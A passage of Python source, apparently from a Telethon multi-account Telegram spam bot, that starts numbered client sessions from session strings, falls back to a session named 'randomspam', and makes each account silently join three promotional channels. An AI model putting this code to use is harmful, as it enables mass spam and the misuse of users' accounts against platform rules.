            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = "randomspam"
        random38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        random39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await random39.start()
            botme = await random39.get_me()
            await random39(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random39(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random39(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = "randomspam"
        random39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        random40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await random40.start()
            botme = await random40.get_me()
            await random40(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random40(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random40(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = "randomspam"
        random40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(Rockerz_Updates())
